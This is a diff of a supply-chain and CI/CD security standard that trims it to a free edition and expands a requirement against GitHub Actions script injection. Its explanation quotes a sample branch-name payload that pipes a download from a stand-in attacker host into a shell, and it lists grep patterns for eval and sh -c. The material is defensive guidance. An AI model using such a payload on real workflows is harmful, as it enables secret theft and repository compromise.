@@ -6,11 +6,11 @@
 | Topics covered | Dependencies, Supply Chain, CI/CD, Source Control |
 | Part of | Hullproof Security Standard, see STANDARD.md |
 
-This document covers the third party code a project installs, the integrity of what flows into a release, the pipeline that tests and deploys it, and the repository that holds it. Secret scanning of source and history lives in SECRETS.md, MCP servers and coding agent configuration live in AGENTIC-DEV-SECURITY.md, over the air mobile updates live in MOBILE-SECURITY.md, and deployment, rollback and platform settings live in INFRASTRUCTURE-SECURITY.md. Vulnerability triage and fix deadlines per severity are set in GOVERNANCE.md (SEC-GOV-040, SEC-GOV-041); this document enforces them at build time. Where a requirement here says a fact or decision is recorded, it goes in the project's architecture record (SEC-GOV-001) or security decisions log (SEC-GOV-002, SEC-GOV-011), never in the Hullproof standard files.
+This document covers the third party code a project installs, the integrity of what flows into a release, the pipeline that tests and deploys it, and the repository that holds it. Secret scanning of source and history lives in SECRETS.md, MCP servers and coding agent configuration live in AGENTIC-DEV-SECURITY.md, over the air mobile updates live in MOBILE-SECURITY.md, and deployment, rollback and platform settings live in INFRASTRUCTURE-SECURITY.md. Vulnerability triage and fix deadlines per severity are set in GOVERNANCE.md (Pro edition requirements); this document enforces them at build time. Where a requirement here says a fact or decision is recorded, it goes in the project's architecture record (a Pro edition requirement) or security decisions log (Pro edition requirements), never in the Hullproof standard files.
 
 <!-- hullproof:index:start -->
 
-> **Free edition.** This document contains 5 of the 35 requirements in this domain: every BLOCKER and every CRITICAL requirement that applies at LAUNCH. Requirement IDs mentioned here but not listed are part of Hullproof Pro.
+> **Free edition.** This document contains 5 of the 39 requirements in this domain: every BLOCKER and every CRITICAL requirement in it. Hullproof Pro holds the other 34. Pro covers your supply chain, including lockfiles, new packages, build and CI hardening, repository access and the provenance of what you ship.
 
 ## Requirement index
 
@@ -34,23 +34,10 @@ Each requirement in this document is listed in exactly one row. A row with no re
 
 | Area | Also see | Primary for | Requirements in this document |
 |------|----------|-------------|-------------------------------|
-| Lockfiles and reproducible installs | None | None | SEC-SUPPLY-001 |
-| Vulnerability scanning on every change | GOVERNANCE.md, INFRASTRUCTURE-SECURITY.md | None | SEC-SUPPLY-015 |
-| Prerelease and canary builds in production | None | None | SEC-SUPPLY-003 |
-| Unmaintained and deprecated packages | None | None | SEC-SUPPLY-006 |
-| New package vetting (typosquatting, slopsquatting, maintainer reputation) | None | None | SEC-SUPPLY-004 |
-| Dependency confusion and private package names | None | None | SEC-SUPPLY-013 |
-| Install scripts | None | None | SEC-SUPPLY-009 |
-| Automated update tooling | None | None | SEC-SUPPLY-005 |
-| Software bill of materials (SBOM) | AI-SECURITY.md | None | SEC-SUPPLY-007 |
-| Build provenance and artifact integrity | INFRASTRUCTURE-SECURITY.md | None | SEC-SUPPLY-008, SEC-SUPPLY-014, SEC-SUPPLY-030 |
-| CI/CD pipeline security | INFRASTRUCTURE-SECURITY.md, AGENTIC-DEV-SECURITY.md, OBSERVABILITY.md | CODEOWNERS | SEC-SUPPLY-016, SEC-SUPPLY-017, SEC-SUPPLY-018, SEC-SUPPLY-019, SEC-SUPPLY-020, SEC-SUPPLY-021, SEC-SUPPLY-031 |
-| CI workflow script injection and workflow linting | None | None | SEC-SUPPLY-032, SEC-SUPPLY-033 |
-| Source control (branch protection, reviews, signed commits) | AGENTIC-DEV-SECURITY.md, GOVERNANCE.md | Missing PR workflow | SEC-SUPPLY-022, SEC-SUPPLY-023, SEC-SUPPLY-024, SEC-SUPPLY-025, SEC-SUPPLY-026, SEC-SUPPLY-027, SEC-SUPPLY-028, SEC-SUPPLY-029 |
-| Third party JavaScript loaded at runtime | FRONTEND-SECURITY.md | Analytics on auth pages | SEC-SUPPLY-010, SEC-SUPPLY-011 |
+| CI/CD pipeline security | INFRASTRUCTURE-SECURITY.md, AGENTIC-DEV-SECURITY.md, OBSERVABILITY.md | CODEOWNERS | SEC-SUPPLY-016 (more in Pro edition) |
+| CI workflow script injection and workflow linting | None | None | SEC-SUPPLY-032 (more in Pro edition) |
+| Source control (branch protection, reviews, signed commits) | AGENTIC-DEV-SECURITY.md, GOVERNANCE.md | Missing PR workflow | SEC-SUPPLY-026 (more in Pro edition) |
 | Mobile dependencies and OTA updates | MOBILE-SECURITY.md | None | SEC-SUPPLY-002 |
-| AI model and MCP server supply chain | AI-SECURITY.md, AGENTIC-DEV-SECURITY.md | None | SEC-SUPPLY-012 |
-| Release age delay and registry trust settings | None | Package release age | SEC-SUPPLY-034 |
 | Account wide credentials in CI | SECRETS.md, INFRASTRUCTURE-SECURITY.md, AGENTIC-DEV-SECURITY.md | Account wide credentials in CI | SEC-SUPPLY-035 |
 <!-- hullproof:coverage-map:end -->
 
@@ -68,7 +55,7 @@ Each requirement in this document is listed in exactly one row. A row with no re
 | Automation | FULL |
 | Verification method | DEPENDENCY SCAN, CONFIG REVIEW |
 
-**Requirement.** Every CI run on a change to the production branch MUST scan all direct and transitive dependencies, including mobile native dependencies, against a public advisory database, and MUST fail when any finding is older than the fix deadline for its severity: 7 days for CRITICAL and 30 days for HIGH, or shorter where the project's vulnerability policy (SEC-GOV-041 in GOVERNANCE.md) sets shorter (the 7 and 30 day figures are Hullproof policy; no external source). The same scan MUST also run on a schedule against the production branch at least weekly, because new advisories appear for code that has not changed (SEC-GOV-042 in GOVERNANCE.md). Any dependency surface the scanner cannot read (native modules resolved at build time, vendored code, container installs, tools run with `npx`) MUST be listed with a substitute check, such as the build service's dependency report or a dated manual review. This requirement is CRITICAL wherever the product has a dependency manifest or lockfile.
+**Requirement.** Every CI run on a change to the production branch MUST scan all direct and transitive dependencies, including mobile native dependencies, against a public advisory database, and MUST fail when any finding is older than the fix deadline for its severity: 7 days for CRITICAL and 30 days for HIGH, or shorter where the project's vulnerability policy (a Pro edition requirement in GOVERNANCE.md) sets shorter (the 7 and 30 day figures are Hullproof policy; no external source). The same scan MUST also run on a schedule against the production branch at least weekly, because new advisories appear for code that has not changed (a Pro edition requirement in GOVERNANCE.md). Any dependency surface the scanner cannot read (native modules resolved at build time, vendored code, container installs, tools run with `npx`) MUST be listed with a substitute check, such as the build service's dependency report or a dated manual review. This requirement is CRITICAL wherever the product has a dependency manifest or lockfile.
 
 **Why.** Known vulnerable components are among the cheapest paths into an application. For example, drizzle-orm below 0.45.2 allows SQL injection through identifier helpers, and several Next.js 15 and 16 releases allow an unauthenticated request to exhaust the server through Server Function endpoints. A scan that only reports, without blocking, lets these ship.
 
@@ -79,7 +66,7 @@ Each requirement in this document is listed in exactly one row. A row with no re
 - A finding that is not reachable in this application may be accepted only under the exception rules in STANDARD.md, recorded in the security decisions log with an owner and a review date, never by disabling the scanner or deleting the rule. Reachability is shown by an import trace to the vulnerable symbol or by a test that fails on the vulnerable version; a package listing from `pnpm why` is not evidence. A development or build only package that runs in CI with a deploy token, a registry publish token or any production secret is treated as a runtime dependency.
 
 **Verify.**
-1. Confirm the scan step runs on every pull request to the production branch and is a required status check (see SEC-SUPPLY-015).
+1. Confirm the scan step runs on every pull request to the production branch and is a required status check (see a Pro edition requirement).
 2. On a branch, pin a package to a version with a known advisory past its deadline, for example `pnpm add drizzle-orm@0.43.1 --filter <app>` in a pnpm monorepo, and confirm the CI run fails when the scanner reads the root `pnpm-lock.yaml`.
 3. Read the scanner configuration and confirm no blanket ignore list or severity override exists without a matching recorded exception.
 4. Confirm a scheduled run of the scan exists for the production branch and ran in the last 7 days. Pin an advisory affected package in each ecosystem the project builds (for example one npm package and one native dependency) and confirm the scheduled run reports it. List every dependency surface the scanner cannot read and its substitute check.
@@ -143,20 +130,20 @@ Each requirement in this document is listed in exactly one row. A row with no re
 | Automation | MANUAL |
 | Verification method | CONFIG REVIEW, DOCUMENT REVIEW |
 
-**Requirement.** A credential stored in a CI secret store, a deploy tool or an agent workspace MUST reach only the one project, repository and environment it serves. It MUST NOT be an account wide, organisation wide or team wide credential, such as a personal access token that carries its owner's full access to every organisation and project (now and in future), or a platform token that can act on projects other than the one being deployed. Where the CI platform and the target provider support OIDC federation, the pipeline MUST use short lived tokens issued by it instead of a stored key. Where they do not, the credential MUST be a scoped token limited to one project with the fewest permissions the job needs, held in a secret scoped to one environment and one repository (SEC-SUPPLY-016). An organisation level CI secret that a production job uses MUST be limited by policy to the named repositories that need it. Staging and production MUST use different credentials (SEC-SECRETS-009). The scope each credential has MUST be recorded when it is created.
+**Requirement.** A credential stored in a CI secret store, a deploy tool or an agent workspace MUST reach only the one project, repository and environment it serves. It MUST NOT be an account wide, organisation wide or team wide credential, such as a personal access token that carries its owner's full access to every organisation and project (now and in future), or a platform token that can act on projects other than the one being deployed. Where the CI platform and the target provider support OIDC federation, the pipeline MUST use short lived tokens issued by it instead of a stored key. Where they do not, the credential MUST be a scoped token limited to one project with the fewest permissions the job needs, held in a secret scoped to one environment and one repository (SEC-SUPPLY-016). An organisation level CI secret that a production job uses MUST be limited by policy to the named repositories that need it. Staging and production MUST use different credentials (a Pro edition requirement). The scope each credential has MUST be recorded when it is created.
 
 **Why.** Anyone who can write to a repository can read every secret stored in it, and a job that runs attacker influenced code can print any secret in its scope. If that secret is an account wide token, one leaked pipeline gives the attacker every project the account can reach, including projects created later. Moving the secret into the secret store (SEC-SUPPLY-016) does not reduce this reach. Only a narrow scope does.
 
 **Implementation.**
 - Prefer OIDC. GitHub Actions can exchange its identity token for a short lived cloud credential, so no long lived cloud secret is stored in GitHub [SRC-154]. Add trust conditions on repository, branch or environment [SRC-154].
 - Supabase personal access tokens come in two kinds. A classic token carries the account's full access on every organisation and project, now and in future. A scoped token carries only the organisations, projects and permissions chosen, and Supabase recommends scoped tokens for AI agents, automation scripts and CI [SRC-151].
-- Keep the Supabase database password out of CI where you can. It is not limited by token scope (SEC-CLOUD-015).
-- Create a machine identity or a service account for the pipeline. Do not use a person's token, because it carries that person's access and ends when the person leaves (SEC-CLOUD-035).
+- Keep the Supabase database password out of CI where you can. It is not limited by token scope (a Pro edition requirement).
+- Create a machine identity or a service account for the pipeline. Do not use a person's token, because it carries that person's access and ends when the person leaves (a Pro edition requirement).
 - GitHub organisation level secrets can be limited by policy to all repositories, to private repositories, or to a named list [SRC-373]. Use the named list for production credentials.
 - GitHub environment secrets are available only to jobs that reference the environment, and the environment's protection rules apply before the job runs or reads them [SRC-373].
 - Do not give a coding agent or an MCP server a credential wider than the task. SEC-AGENT-011 owns production secrets in a coding agent's context. Record any credential that sits in an agent workspace in the same list.
 - Where a provider has no scoped token and no OIDC, use a dedicated account that belongs to that one project only, with the lowest role the job needs, and record the gap in the decisions log with a rotation date. A shared account that also reaches other projects does not meet the Requirement. Check your team's token settings for whether a token can be limited to one project before you rely on it.
-- Expiry, trust policy detail and the credential inventory are owned by SEC-CLOUD-015. This requirement owns the LAUNCH rule on reach. Report one finding for a wide credential, under this ID.
+- Expiry, trust policy detail and the credential inventory are owned by a Pro edition requirement. This requirement owns the LAUNCH rule on reach. Report one finding for a wide credential, under this ID.
 
 **Verify.**
 1. List every credential the pipeline, the deploy tools and the agent workspace hold: repository secrets, environment secrets, organisation secrets (`gh secret list`, `gh secret list --env <name>` and `gh secret list --org <org>` list names only) and platform variables. For each record the provider, the kind of credential, and the projects it can reach.
@@ -186,9 +173,9 @@ Each requirement in this document is listed in exactly one row. A row with no re
 | Automation | FULL |
 | Verification method | STATIC ANALYSIS |
 
-**Requirement.** CI workflows MUST NOT place attacker controllable context values inside `${{ }}` expressions in `run:` scripts, `actions/github-script` `script:` inputs, or lines written to `GITHUB_ENV`, `GITHUB_OUTPUT` or `GITHUB_PATH`. Attacker controllable values include every `github.event` field that ends in `body`, `default_branch`, `email`, `head_ref`, `label`, `message`, `name`, `page_name`, `ref` or `title`, plus `github.head_ref`, commit messages and author fields, and outputs derived from any of them. Such values MUST reach a script only as an action input or through an `env:` variable referenced in double quotes.
+**Requirement.** CI workflows MUST NOT place attacker controllable context values inside `${{ }}` expressions in `run:` scripts, in the `script:` input of `actions/github-script` (including when `script:` sits under `with:`, where it is still a script and not a plain input), or in lines written to `GITHUB_ENV`, `GITHUB_OUTPUT` or `GITHUB_PATH`. Attacker controllable values include every `github.event` field that ends in `body`, `default_branch`, `email`, `head_ref`, `label`, `message`, `name`, `page_name`, `ref` or `title`, plus `github.event.workflow_run.head_branch`, `github.head_ref`, `github.ref_name`, commit messages and author fields, the `inputs.*` values that a caller workflow passes to a reusable workflow, and any step output, job output or `format()` or `contains()` result built from any of them. Such values MUST reach a script only as an action input that is not a script, or through an `env:` variable, and the script MUST then use the variable as data: quoted, and never passed to `eval`, `bash -c`, `sh -c` or another command that parses it a second time.
 
-**Why.** GitHub substitutes `${{ }}` expressions into the generated script before the shell runs it, so a pull request title, issue title, comment or branch name such as `a"; curl attacker.example | sh #` becomes a command on the runner. That command can read every secret the job holds, including deploy tokens and payment provider keys, and can use the job token to push code. OpenSSF Scorecard rates untrusted input in workflow scripts as Critical because it can lead to full repository compromise.
+**Why.** GitHub substitutes `${{ }}` expressions into the generated script before the shell runs it, so a pull request title, issue title, comment or branch name such as `a"; curl attacker.example | sh #` becomes a command on the runner. The same holds for a `script:` value of `actions/github-script`, which is JavaScript built from the same substitution. A value read from `env:` is safe only while the script treats it as data; `eval "$TITLE"` or `bash -c "$TITLE"` runs it again as code. That command can read every secret the job holds, including deploy tokens and payment provider keys, and can use the job token to push code. OpenSSF Scorecard rates untrusted input in workflow scripts as Critical because it can lead to full repository compromise.
 
 **Implementation.**
 - Write:
@@ -198,23 +185,26 @@ Each requirement in this document is listed in exactly one row. A row with no re
     run: echo "$TITLE"
   ```
   never `run: echo "${{ github.event.pull_request.title }}"`.
-- In `actions/github-script`, read the value from `context.payload` or `process.env` inside the script, not from an expression in `script:`.
+- In `actions/github-script`, read the value from `context.payload` or `process.env` inside the script, never from an expression in `script:`, including a `script:` nested under `with:`.
+- Never feed an `env:` value to `eval`, `bash -c`, `sh -c` or `xargs sh -c`. A branch name from `workflow_run`, a value passed in from a calling workflow and an output of an earlier step are untrusted in the same way as a title.
 - Never write untrusted text into `GITHUB_ENV` or `GITHUB_PATH`; a crafted value can set variables such as `NODE_OPTIONS` for later steps.
-- Keep top level `permissions` read only (SEC-SUPPLY-019) and production secrets in a protected environment (SEC-SUPPLY-016) so a missed injection reaches less.
+- Keep top level `permissions` read only (a Pro edition requirement) and production secrets in a protected environment (SEC-SUPPLY-016) so a missed injection reaches less.
 - Prefer a maintained action that takes the value as an input over inline shell when one exists.
 
 **Verify.**
-1. Run `zizmor .github/workflows/ .github/actions/` and confirm no open `template-injection` or `github-env` findings.
+1. Run `zizmor --persona=auditor .github/workflows/ .github/actions/` and confirm no open `template-injection` or `github-env` finding at any confidence level. This is the test.
 2. Run `actionlint` and confirm no `[expression]` errors that mention a potentially untrusted input.
-3. Run `grep -rnE '\$\{\{ *(github\.event\.|github\.head_ref)' .github/` and confirm every hit sits under `env:` or `with:`, not inside a `run:` or `script:` block.
+3. As a hint only, run `grep -rnE '\$\{\{[^}]*(github\.event|github\.head_ref|github\.ref_name|inputs\.|outputs\.|format\(|contains\()' .github/` and read every hit. A hit passes only when it sits under `env:` or in a `with:` input that is not `script:`, and never inside a `run:` block or a `script:` value. The grep cannot follow a value through intermediate steps, so a clean grep does not replace step 1.
+4. Run `grep -rnE 'eval |bash -c|sh -c' .github/` and confirm none of the hits runs a variable that holds event data.
+5. On a scratch branch, add a step with `uses: actions/github-script` and `with: script: console.log("${{ github.event.issue.title }}")` and a `run:` step that echoes `${{ github.event.workflow_run.head_branch }}`, and confirm the linter fails on both (a Pro edition requirement).
 
-**Evidence.** zizmor and actionlint output and the reviewed grep result.
+**Evidence.** zizmor and actionlint output, the reviewed grep results and the failing scratch branch from step 5.
 
 **Exceptions.** A value proven to be safe by type, such as `github.event.pull_request.number` or a commit SHA, may appear in an expression; record each case in the workflow as a comment. No exception for the free text fields listed in the Requirement.
 
-**References.** GitHub Script injections, Understanding the risk of script injections; Secure use reference, Good practices for mitigating script injection attacks (Use an action instead of an inline script; Use an intermediate environment variable) [SRC-220]; GitHub Security Lab, Keeping your GitHub Actions and workflows secure Part 2: Untrusted input [SRC-222]; OpenSSF Scorecard Dangerous-Workflow, Risk Critical [SRC-224]; OWASP CI/CD Security Cheat Sheet, Pipeline and Execution Environment [SRC-049]; NIST SSDF 1.1 PW.5.1 [SRC-050]. Severity is CRITICAL rather than BLOCKER because exploitation needs someone who can trigger the workflow (anyone on a public repository, collaborators on a private one, SEC-SUPPLY-022); an auditor should rate a finding on a public repository whose job holds production deploy or payment secrets as BLOCKER under rating rule 2. The stage is LAUNCH since the fix costs nothing and the default stack ships through GitHub Actions from launch day.
+**References.** GitHub Script injections, Understanding the risk of script injections; Secure use reference, Good practices for mitigating script injection attacks (Use an action instead of an inline script; Use an intermediate environment variable) [SRC-220]; GitHub Security Lab, Keeping your GitHub Actions and workflows secure Part 2: Untrusted input [SRC-222]; OpenSSF Scorecard Dangerous-Workflow, Risk Critical [SRC-224]; OWASP CI/CD Security Cheat Sheet, Pipeline and Execution Environment [SRC-049]; NIST SSDF 1.1 PW.5.1 [SRC-050]. Severity is CRITICAL rather than BLOCKER because exploitation needs someone who can trigger the workflow (anyone on a public repository, collaborators on a private one, a Pro edition requirement); an auditor should rate a finding on a public repository whose job holds production deploy or payment secrets as BLOCKER under rating rule 2. The stage is LAUNCH since the fix costs nothing and the default stack ships through GitHub Actions from launch day.
 
-**AI Agent Instruction.** Never write `${{ github.event... }}` or `${{ github.head_ref }}` inside a `run:` or `script:` block. Pass the value through `env:` and quote the variable. If you find this pattern in an existing workflow, report it as CRITICAL and fix it before any other workflow change.
+**AI Agent Instruction.** Never write `${{ github.event... }}`, `${{ github.head_ref }}` or `${{ github.ref_name }}` inside a `run:` block or a `script:` value, and never run an environment variable that holds event data through `eval` or `sh -c`. Pass the value through `env:` and quote the variable. If you find this pattern in an existing workflow, report it as CRITICAL and fix it before any other workflow change.
 
 ---
 
